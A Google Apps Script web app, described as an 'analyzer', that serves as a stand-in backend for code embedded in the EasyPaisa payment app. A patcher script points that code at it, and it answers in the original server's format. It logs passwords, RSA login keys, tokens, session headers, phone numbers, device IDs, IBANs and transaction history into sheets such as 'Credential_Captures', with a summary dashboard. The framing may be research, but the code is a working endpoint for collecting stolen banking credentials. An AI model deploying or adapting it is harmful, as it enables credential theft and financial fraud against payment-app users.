// ============================================================================
// Google Apps Script — EasyPaisa Embedded Code Backend Analyzer
// Deploy as Web App: Execute as "Me", Access: "Anyone"
// ============================================================================
//
// SETUP INSTRUCTIONS:
// 1. Go to https://script.google.com → New Project
// 2. Paste this entire code
// 3. Click "Deploy" → "New deployment"
// 4. Type: "Web app"
// 5. Execute as: "Me"
// 6. Who has access: "Anyone"
// 7. Click "Deploy" and copy the URL
// 8. Give that URL to the patcher script
// ============================================================================

function doPost(e) {
  try {
    var sheet = getOrCreateSheet("Incoming_Requests");
    var timestamp = new Date().toISOString();
    var contentType = e.contentType || "unknown";
    var rawBody = e.postData ? e.postData.contents : "";
    var sourceIP = "N/A"; // Apps Script doesn't expose client IP
    
    // Try to parse JSON body
    var parsedData = {};
    try {
      parsedData = JSON.parse(rawBody);
    } catch(err) {
      parsedData = { raw: rawBody };
    }
    
    // Log to main sheet
    sheet.appendRow([
      timestamp,
      contentType,
      rawBody.substring(0, 50000), // Sheets cell limit
      JSON.stringify(parsedData, null, 2).substring(0, 50000)
    ]);
    
    // Parse and categorize the data into specialized sheets
    categorizeData(timestamp, parsedData, rawBody);
    
    // Return a response the embedded code expects
    // (mimics the original server's response format)
    return ContentService
      .createTextOutput(JSON.stringify({
        "status": "success",
        "code": 200,
        "message": "ok",
        "data": {}
      }))
      .setMimeType(ContentService.MimeType.JSON);
      
  } catch(error) {
    var errSheet = getOrCreateSheet("Errors");
    errSheet.appendRow([new Date().toISOString(), error.toString(), error.stack]);
    
    return ContentService
      .createTextOutput(JSON.stringify({"status": "error"}))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet(e) {
  // Handle GET requests (ping/health check)
  var sheet = getOrCreateSheet("Incoming_Requests");
  var params = e.parameter ? JSON.stringify(e.parameter) : "none";
  
  sheet.appendRow([
    new Date().toISOString(),
    "GET",
    params,
    "Health check / ping"
  ]);
  
  return ContentService
    .createTextOutput(JSON.stringify({
      "status": "success",
      "code": 200,
      "message": "pong"
    }))
    .setMimeType(ContentService.MimeType.JSON);
}

// ── Categorize incoming data into specialized sheets ──

function categorizeData(timestamp, data, rawBody) {
  
  // 1. Credential captures (RSA keys, passwords, tokens)
  if (rawBody.includes("RSA") || rawBody.includes("LoginRsaKey") || 
      rawBody.includes("LoginPwd") || rawBody.includes("LoginBody") ||
      rawBody.includes("token") || rawBody.includes("session")) {
    var credSheet = getOrCreateSheet("Credential_Captures");
    credSheet.appendRow([
      timestamp,
      data.LoginRsaKey || extractField(rawBody, "LoginRsaKey"),
      data.LoginPwd || extractField(rawBody, "LoginPwd"),
      data.token || extractField(rawBody, "token"),
      data.sessionId || extractField(rawBody, "sessionId"),
      rawBody.substring(0, 10000)
    ]);
  }
  
  // 2. Device metadata syncs
  if (rawBody.includes("android_id") || rawBody.includes("deviceUniqueId") ||
      rawBody.includes("phoneNumber") || rawBody.includes("meta")) {
    var metaSheet = getOrCreateSheet("Device_Metadata");
    metaSheet.appendRow([
      timestamp,
      data.phoneNumber || extractField(rawBody, "phoneNumber"),
      data.android_id || extractField(rawBody, "android_id"),
      data.deviceUniqueId || extractField(rawBody, "deviceUniqueId"),
      data.clientVersion || extractField(rawBody, "clientVersion"),
      data.pluginVersion || extractField(rawBody, "pluginVersion"),
      data.androidAdId || extractField(rawBody, "androidAdId"),
      rawBody.substring(0, 10000)
    ]);
  }
  
  // 3. Payment/Transfer data
  if (rawBody.includes("paymentChannel") || rawBody.includes("iban") ||
      rawBody.includes("transfer") || rawBody.includes("amount")) {
    var paySheet = getOrCreateSheet("Payment_Activity");
    paySheet.appendRow([
      timestamp,
      data.paymentChannel || extractField(rawBody, "paymentChannel"),
      data.iban || extractField(rawBody, "iban"),
      data.amount || extractField(rawBody, "amount"),
      data.userType || extractField(rawBody, "userType"),
      rawBody.substring(0, 10000)
    ]);
  }
  
  // 4. Transaction history pulls
  if (rawBody.includes("transactionHistory") || rawBody.includes("TransactionHistory") ||
      rawBody.includes("getTransactionHistory")) {
    var txSheet = getOrCreateSheet("Transaction_History");
    txSheet.appendRow([
      timestamp,
      rawBody.substring(0, 50000)
    ]);
  }
  
  // 5. HTTP header / session data
  if (rawBody.includes("httpHeaderXLemon") || rawBody.includes("header") ||
      rawBody.includes("session.json")) {
    var headerSheet = getOrCreateSheet("Session_Headers");
    headerSheet.appendRow([
      timestamp,
      data.header || "",
      rawBody.substring(0, 10000)
    ]);
  }
  
  // 6. SyncMeta calls (from Go native module)
  if (rawBody.includes("syncMeta") || rawBody.includes("SyncMeta") ||
      rawBody.includes("CustomEncode")) {
    var syncSheet = getOrCreateSheet("SyncMeta_Calls");
    syncSheet.appendRow([
      timestamp,
      rawBody.substring(0, 50000)
    ]);
  }
}

// ── Helper functions ──

function getOrCreateSheet(name) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName(name);
  
  if (!sheet) {
    sheet = ss.insertSheet(name);
    
    // Add headers based on sheet type
    var headers = {
      "Incoming_Requests": ["Timestamp", "Content-Type", "Raw Body", "Parsed JSON"],
      "Credential_Captures": ["Timestamp", "RSA Key", "Password", "Token", "Session ID", "Raw Data"],
      "Device_Metadata": ["Timestamp", "Phone Number", "Android ID", "Device Unique ID", "Client Version", "Plugin Version", "Ad ID", "Raw Data"],
      "Payment_Activity": ["Timestamp", "Payment Channel", "IBAN", "Amount", "User Type", "Raw Data"],
      "Transaction_History": ["Timestamp", "Raw Data"],
      "Session_Headers": ["Timestamp", "Header Data", "Raw Data"],
      "SyncMeta_Calls": ["Timestamp", "Raw Data"],
      "Errors": ["Timestamp", "Error", "Stack Trace"]
    };
    
    if (headers[name]) {
      sheet.getRange(1, 1, 1, headers[name].length).setValues([headers[name]]);
      sheet.getRange(1, 1, 1, headers[name].length)
        .setBackground("#1a73e8")
        .setFontColor("#ffffff")
        .setFontWeight("bold");
      sheet.setFrozenRows(1);
    }
  }
  
  return sheet;
}

function extractField(text, fieldName) {
  // Try to extract a field value from various formats
  var patterns = [
    new RegExp('"' + fieldName + '"\\s*:\\s*"([^"]*)"'),
    new RegExp(fieldName + '[:=]\\s*([^,\\n#]+)'),
  ];
  
  for (var i = 0; i < patterns.length; i++) {
    var match = text.match(patterns[i]);
    if (match) return match[1].trim();
  }
  return "";
}

// ── Dashboard summary (run manually or on timer) ──

function generateDashboard() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var dashboard = getOrCreateSheet("Dashboard");
  dashboard.clear();
  
  var sheets = ["Incoming_Requests", "Credential_Captures", "Device_Metadata", 
                "Payment_Activity", "Transaction_History", "SyncMeta_Calls"];
  
  dashboard.getRange(1, 1).setValue("EMBEDDED CODE BACKEND ANALYSIS DASHBOARD");
  dashboard.getRange(1, 1).setFontSize(16).setFontWeight("bold");
  
  dashboard.getRange(3, 1).setValue("Sheet Name");
  dashboard.getRange(3, 2).setValue("Total Entries");
  dashboard.getRange(3, 3).setValue("First Seen");
  dashboard.getRange(3, 4).setValue("Last Seen");
  dashboard.getRange(3, 1, 1, 4).setBackground("#1a73e8").setFontColor("#fff").setFontWeight("bold");
  
  var row = 4;
  sheets.forEach(function(name) {
    var sheet = ss.getSheetByName(name);
    if (sheet && sheet.getLastRow() > 1) {
      dashboard.getRange(row, 1).setValue(name);
      dashboard.getRange(row, 2).setValue(sheet.getLastRow() - 1);
      dashboard.getRange(row, 3).setValue(sheet.getRange(2, 1).getValue());
      dashboard.getRange(row, 4).setValue(sheet.getRange(sheet.getLastRow(), 1).getValue());
      row++;
    }
  });
  
  dashboard.autoResizeColumns(1, 4);
}

